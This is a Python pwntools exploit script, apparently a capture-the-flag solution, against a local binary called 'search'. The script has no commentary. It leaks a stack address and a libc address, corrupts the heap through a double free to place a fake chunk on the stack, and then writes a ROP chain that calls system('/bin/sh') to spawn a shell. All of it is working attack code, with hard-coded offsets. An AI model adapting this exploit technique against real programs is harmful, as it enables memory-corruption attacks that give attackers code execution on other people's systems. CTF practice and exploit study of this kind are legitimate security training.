#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

p = process("./search")

def search(word, s):
    p.recvuntil("3: Quit\n")
    p.sendline("1")
    p.recvline("Enter the word size:")
    p.sendline(str(len(word)))
    p.recvline("Enter the word:")
    p.send(word)
    if (s != ""):
        p.sendline(str(s))
        return p.recvline()

def index(word):
    p.sendline("2")
    p.sendline(str(len(word)))
    p.send(word)
    p.recvuntil("Added sentence")

def leak_stack():
    p.recvuntil("3: Quit\n")
    p.sendline("A"*48)
    p.recvline()
    p.sendline("A"*48)
    leak = p.recvline().split(" ")[0][48:]

    if leak != "":
    	return u64(leak.ljust(8, "\x00"))
    else:
    	log.info("leak_stack: fail!")
    	p.sendline("3")
    	exit()

def leak_libc():
    index("a "+"a"*14)
    search("a", "y")
    index("A"*0x80)
    search("A"*0x80, "y")

    return u64(search("\x78", "n")[10:18].ljust(8, "\x00"))-0x3c4b78


stack_ptr = leak_stack()
libc_base = leak_libc()
stack_addr = stack_ptr+0x22-0x8

log.info("libc_base: " + hex(libc_base))
log.info("stack pointer: " + hex(stack_ptr))

system_addr = libc_base+0x45390
bin_sh_addr = libc_base+0x18cd17
pop_rdi_ret = 0x400e23

index("B"*0x2e+" E")
index("C"*0x2e+" E")
index("D"*0x2e+" E")
search("E", "y")
p.sendline("y")
p.sendline("y")
p.sendline("n")
search("\x00", "y")
p.sendline("n")

fake_chunk = p64(stack_addr)
index(fake_chunk+"\x00"*0x28)
index("b"*0x30)
index("c"*0x30)

payload = "A"*0x1e
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
index(payload)

p.interactive()